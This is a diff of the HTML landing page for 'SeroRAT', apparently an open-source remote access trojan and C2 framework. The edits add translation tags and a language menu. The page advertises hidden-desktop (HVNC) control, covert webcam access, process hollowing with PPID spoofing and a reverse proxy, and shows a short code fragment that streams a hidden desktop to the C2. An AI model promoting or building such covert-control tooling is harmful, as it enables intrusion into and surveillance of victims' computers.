@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -24,9 +24,8 @@
   </audio>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css?v=6">
+  <link rel="stylesheet" href="style.css?v=7">
   <style>
-    /* Inline fallback — bypasses all external CSS caching */
     @media (max-width: 900px) {
       #nav-links { display: none !important; }
     }
@@ -39,7 +38,7 @@
 
 <!-- Lightbox -->
 <div id="lightbox" role="dialog" aria-modal="true">
-  <button id="lightbox-close" aria-label="Fermer">&times;</button>
+  <button id="lightbox-close" aria-label="Close">&times;</button>
   <img id="lightbox-img" src="" alt="">
 </div>
 
@@ -52,10 +51,39 @@
     </a>
     <div class="nav-right">
       <ul class="nav-links" id="nav-links">
-        <li><a href="#features">Features</a></li>
-        <li><a href="#showcase">Showcase</a></li>
-        <li><a href="#pricing">Pricing</a></li>
+        <li><a href="#features" data-i18n="nav.features">Features</a></li>
+        <li><a href="#showcase" data-i18n="nav.showcase">Showcase</a></li>
+        <li><a href="#pricing" data-i18n="nav.pricing">Pricing</a></li>
       </ul>
+
+      <!-- Language switcher -->
+      <div class="lang-wrap">
+        <button class="lang-btn" id="lang-btn" aria-haspopup="true" aria-expanded="false" aria-label="Select language">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20"/></svg>
+          <span id="lang-current">EN</span>
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>
+        </button>
+        <div class="lang-menu" id="lang-menu" hidden>
+          <button class="lang-opt" data-lang="en"><span class="lang-flag">🇺🇸</span> English</button>
+          <button class="lang-opt" data-lang="fr"><span class="lang-flag">🇫🇷</span> Français</button>
+          <button class="lang-opt" data-lang="es"><span class="lang-flag">🇪🇸</span> Español</button>
+          <button class="lang-opt" data-lang="de"><span class="lang-flag">🇩🇪</span> Deutsch</button>
+          <button class="lang-opt" data-lang="pt"><span class="lang-flag">🇧🇷</span> Português</button>
+          <button class="lang-opt" data-lang="ru"><span class="lang-flag">🇷🇺</span> Русский</button>
+          <button class="lang-opt" data-lang="zh"><span class="lang-flag">🇨🇳</span> 中文</button>
+          <button class="lang-opt" data-lang="ja"><span class="lang-flag">🇯🇵</span> 日本語</button>
+          <button class="lang-opt" data-lang="ar"><span class="lang-flag">🇸🇦</span> العربية</button>
+          <button class="lang-opt" data-lang="it"><span class="lang-flag">🇮🇹</span> Italiano</button>
+          <button class="lang-opt" data-lang="nl"><span class="lang-flag">🇳🇱</span> Nederlands</button>
+          <button class="lang-opt" data-lang="tr"><span class="lang-flag">🇹🇷</span> Türkçe</button>
+          <button class="lang-opt" data-lang="ko"><span class="lang-flag">🇰🇷</span> 한국어</button>
+          <button class="lang-opt" data-lang="pl"><span class="lang-flag">🇵🇱</span> Polski</button>
+          <button class="lang-opt" data-lang="id"><span class="lang-flag">🇮🇩</span> Bahasa Indonesia</button>
+          <button class="lang-opt" data-lang="vi"><span class="lang-flag">🇻🇳</span> Tiếng Việt</button>
+          <button class="lang-opt" data-lang="uk"><span class="lang-flag">🇺🇦</span> Українська</button>
+        </div>
+      </div>
+
       <a class="btn-gh" href="https://github.com/SeroSkiid/SeroC2" target="_blank" rel="noopener">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33.85 0 1.71.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0012 2z"/></svg>
         GitHub
@@ -67,19 +95,19 @@
 <!-- Hero -->
 <section class="hero">
   <div class="container">
-    <p class="eyebrow"><span class="dot-live"></span><span class="prompt">$</span>&nbsp;open source &nbsp;·&nbsp; MIT &nbsp;·&nbsp; authorized use only</p>
-    <h1>The C2/RAT they charge<br><em>$2,000 for.</em><br><span class="hero-free">Free.</span></h1>
-    <p class="hero-lead">
+    <p class="eyebrow"><span class="dot-live"></span><span class="prompt">$</span>&nbsp;<span data-i18n="hero.eyebrow">open source &nbsp;·&nbsp; MIT &nbsp;·&nbsp; authorized use only</span></p>
+    <h1><span data-i18n="hero.h1a">The C2/RAT they charge</span><br><em data-i18n="hero.h1b">$2,000 for.</em><br><span class="hero-free" data-i18n="hero.h1c">Free.</span></h1>
+    <p class="hero-lead" data-i18n="hero.lead">
       HVNC, DXGI remote desktop at 60fps, remote webcam via DirectShow,
       process hollowing with PPID spoof, NativeAOT stub — 40+ features.
       Everything the expensive ones have. None of the price tag.
     </p>
     <div class="hero-actions">
       <a class="btn-primary" href="https://github.com/SeroSkiid/SeroC2" target="_blank" rel="noopener">
-        View on GitHub
+        <span data-i18n="hero.cta1">View on GitHub</span>
         <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
       </a>
-      <a class="btn-outline" href="#showcase">Screenshots</a>
+      <a class="btn-outline" href="#showcase" data-i18n="hero.cta2">Screenshots</a>
     </div>
     <p class="hero-meta">
       <span>40+ features</span><span class="sep">·</span>
@@ -97,7 +125,7 @@
         <span class="screen-dot red"></span>
         <span class="screen-dot yellow"></span>
         <span class="screen-dot green"></span>
-        <span class="screen-label">SeroRAT — Online Clients</span>
+        <span class="screen-label">Dashboard</span>
       </div>
       <div class="screen-body">
         <img src="assets/dashboard.png" alt="SeroRAT dashboard — client list with online clients">
@@ -138,10 +166,10 @@
 <!-- Features -->
 <section class="features-section" id="features">
   <div class="container">
-    <h2 class="section-h">What it does.</h2>
+    <h2 class="section-h" data-i18n="s.features">What it does.</h2>
     <div class="feat-grid">
       <div class="feat-col reveal">
-        <h4>Monitoring</h4>
+        <h4 data-i18n="col.mon">Monitoring</h4>
         <ul>
           <li>Remote Desktop — DXGI + GDI fallback</li>
           <li>HVNC — isolated hidden desktop</li>
@@ -153,7 +181,7 @@
         </ul>
       </div>
       <div class="feat-col reveal">
-        <h4>Administration</h4>
+        <h4 data-i18n="col.adm">Administration</h4>
         <ul>
           <li>File Manager — browse / upload / exec</li>
           <li>Process Manager — tree view, icons</li>
@@ -165,7 +193,7 @@
         </ul>
       </div>
       <div class="feat-col reveal">
-        <h4>Offensive</h4>
+        <h4 data-i18n="col.off">Offensive</h4>
         <ul>
           <li>RunPE — in-memory + PPID spoof</li>
           <li>Reverse SOCKS5 proxy</li>
@@ -183,29 +211,29 @@
 <!-- Pricing -->
 <section class="price-section" id="pricing">
   <div class="container">
-    <h2 class="section-h">The market.</h2>
-    <p class="section-sub">What others charge for the same thing — often worse, and closed to inspect.</p>
+    <h2 class="section-h" data-i18n="s.pricing">The market.</h2>
+    <p class="section-sub" data-i18n="s.pricing.sub">What others charge for the same thing — often worse, and closed to inspect.</p>
     <div class="price-table-wrap"><table class="price-table">
       <tbody>
         <tr class="reveal">
           <td>Cobalt Strike</td>
           <td class="price-val strike">$5,000 / yr</td>
-          <td class="price-note-cell">commercial, closed source</td>
+          <td class="price-note-cell" data-i18n="price.closed">commercial, closed source</td>
         </tr>
         <tr class="reveal">
           <td>Brute Ratel</td>
           <td class="price-val strike">$2,500 / yr</td>
-          <td class="price-note-cell">commercial, closed source</td>
+          <td class="price-note-cell" data-i18n="price.closed">commercial, closed source</td>
         </tr>
         <tr class="reveal">
           <td>PureRAT</td>
           <td class="price-val strike">$2,000 lifetime</td>
-          <td class="price-note-cell red-note">reversed &amp; leaked anyway</td>
+          <td class="price-note-cell red-note" data-i18n="price.leaked">reversed &amp; leaked anyway</td>
         </tr>
         <tr class="price-highlight reveal">
           <td><strong>SeroRAT</strong></td>
           <td class="price-val green-val">$0 — open source</td>
-          <td class="price-note-cell">MIT, full source on GitHub</td>
+          <td class="price-note-cell" data-i18n="price.ours">MIT, full source on GitHub</td>
         </tr>
       </tbody>
     </table></div>
@@ -215,8 +243,8 @@
 <!-- Showcase -->
 <section class="showcase-section" id="showcase">
   <div class="container">
-    <h2 class="section-h">Real screenshots.</h2>
-    <p class="section-sub">No mocked-up demos. Actual captures from the server.</p>
+    <h2 class="section-h" data-i18n="s.showcase">Real screenshots.</h2>
+    <p class="section-sub" data-i18n="s.showcase.sub">No mocked-up demos. Actual captures from the server.</p>
     <div class="gallery">
       <div class="gallery-item reveal">
         <img src="assets/listonline.png" alt="SeroRAT — online clients list" loading="lazy">
@@ -224,7 +252,7 @@
       </div>
       <div class="gallery-item reveal">
         <img src="assets/builder.png" alt="SeroRAT builder — NativeAOT stub generator" loading="lazy">
-        <span class="gallery-label">Builder NativeAOT stab</span>
+        <span class="gallery-label">Builder NativeAOT stub</span>
       </div>
       <div class="gallery-item reveal">
         <img src="assets/listonline2.png" alt="SeroRAT — client detail view" loading="lazy">
@@ -242,8 +270,8 @@
 <section class="tech-section" id="technical">
   <div class="container tech-layout">
     <div class="tech-text">
-      <h2 class="section-h">No shortcuts.</h2>
-      <p class="section-sub" style="margin-bottom:0">The details that separate a demo from something you'd actually deploy.</p>
+      <h2 class="section-h" data-i18n="s.tech">No shortcuts.</h2>
+      <p class="section-sub" data-i18n="s.tech.sub" style="margin-bottom:0">The details that separate a demo from something you'd actually deploy.</p>
       <ul class="tech-list">
         <li class="reveal">
           <strong>TLS 1.2+ with certificate pinning</strong>
@@ -262,25 +290,24 @@
     <div class="code-block reveal">
       <div class="code-header">
         <span class="cdot red"></span><span class="cdot yellow"></span><span class="cdot green"></span>
-        <span class="code-filename">HvncFeature.cpp</span>
+        <span class="code-filename">HvncFeature.cs</span>
       </div>
       <pre class="code-body"><code><span class="cm">// Create isolated shadow desktop — invisible to user</span>
-HDESK hvnc = CreateDesktopW(L<span class="num">"SeroHVNC"</span>,
-    NULL, NULL, <span class="num">0</span>, GENERIC_ALL, NULL);
+nint hvnc = CreateDesktop(<span class="num">"SeroHVNC"</span>,
+    <span class="num">0</span>, <span class="num">0</span>, <span class="num">0</span>, DESKTOP_ALL, <span class="num">0</span>);
 
-<span class="cm">// Inject browser directly into hidden session</span>
-STARTUPINFOW si  = { <span class="kw">sizeof</span>(si) };
-si.lpDesktop     = (LPWSTR)L<span class="num">"SeroHVNC"</span>;
-si.dwFlags       = STARTF_USESHOWWINDOW;
-si.wShowWindow   = SW_SHOWMAXIMIZED;
-PROCESS_INFORMATION pi = {};
+<span class="cm">// Launch browser directly into hidden session</span>
+<span class="kw">var</span> si = <span class="kw">new</span> STARTUPINFOW {
+    cb          = (<span class="kw">uint</span>)Marshal.SizeOf&lt;STARTUPINFOW&gt;(),
+    lpDesktop   = <span class="num">"SeroHVNC"</span>,
+    dwFlags     = STARTF_USESHOWWINDOW,
+    wShowWindow = SW_SHOWMAXIMIZED
+};
+CreateProcessW(<span class="num">0</span>, <span class="kw">new</span> StringBuilder(browserCmd),
+    <span class="num">0</span>, <span class="num">0</span>, <span class="kw">false</span>, CREATE_UNICODE_ENVIRONMENT,
+    envBlock, <span class="num">0</span>, <span class="kw">ref</span> si, <span class="kw">out var</span> pi);
 
-CreateProcessW(chromePath, cmdArgs,
-    NULL, NULL, FALSE,
-    CREATE_NEW_PROCESS_GROUP,
-    NULL, NULL, &amp;si, &amp;pi);
-
-<span class="cm">// Mirror shadow desktop — stream to C2</span>
+<span class="cm">// Capture thread — stream JPEG frames to C2</span>
 SetThreadDesktop(hvnc);
 <span class="kw">while</span> (_running)
     SendFrameAsync(CaptureDesktop(hvnc));</code></pre>
@@ -288,11 +315,28 @@ SetThreadDesktop(hvnc);
   </div>
 </section>
 
+<!-- HVNC demo video -->
+<section class="testimonial-section">
+  <div class="container">
+    <h2 class="section-h" data-i18n="s.hvnc">HVNC in action.</h2>
+    <p class="section-sub" data-i18n="s.hvnc.sub">Live demo — hidden desktop, browser session, full control. No editing.</p>
+    <div class="video-wrap reveal">
+      <video
+        src="assets/demohvnc2.MP4"
+        controls
+        preload="metadata"
+        playsinline
+        poster="assets/dashboard.png"
+      ></video>
+    </div>
+  </div>
+</section>
+
 <!-- Contributors -->
 <section class="contrib-section">
   <div class="container">
-    <h2 class="section-h">Contributors.</h2>
-    <p class="section-sub">People who built this.</p>
+    <h2 class="section-h" data-i18n="s.contrib">Contributors.</h2>
+    <p class="section-sub" data-i18n="s.contrib.sub">People who built this.</p>
     <div class="contrib-grid">
       <div class="contrib-card reveal">
         <img src="assets/contrib-sero.jpg" alt="Serotonine" class="contrib-avatar">
@@ -319,30 +363,13 @@ SetThreadDesktop(hvnc);
   </div>
 </section>
 
-<!-- Demo video -->
-<section class="testimonial-section">
-  <div class="container">
-    <h2 class="section-h">HVNC in action.</h2>
-    <p class="section-sub">Live demo — hidden desktop, browser session, full control. No editing.</p>
-    <div class="video-wrap reveal">
-      <video
-        src="assets/demohvnc2.MP4"
-        controls
-        preload="metadata"
-        playsinline
-        poster="assets/dashboard.png"
-      ></video>
-    </div>
-  </div>
-</section>
-
 <!-- CTA -->
 <section class="cta-section">
   <div class="container cta-inner">
     <img src="assets/serofondtransparent.png" alt="" class="cta-logo" onerror="this.style.display='none'">
-    <h2>Open source.<br>No strings.</h2>
-    <p>Fork it. Build on it. Make it yours.<br>Just use it on systems you have authorization for.</p>
-    <p class="legal">For authorized use only — red team engagements, security research, CTF. You are responsible for where you point it.</p>
+    <h2><span data-i18n="cta.h1">Open source.</span><br><span data-i18n="cta.h2">No strings.</span></h2>
+    <p data-i18n="cta.body">Fork it. Build on it. Make it yours.<br>Just use it on systems you have authorization for.</p>
+    <p class="legal" data-i18n="cta.legal">For authorized use only — red team engagements, security research, CTF. You are responsible for where you point it.</p>
   </div>
 </section>
 
@@ -366,6 +393,6 @@ SetThreadDesktop(hvnc);
 </footer>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-<script src="script.js?v=6"></script>
+<script src="script.js?v=7"></script>
 </body>
 </html>
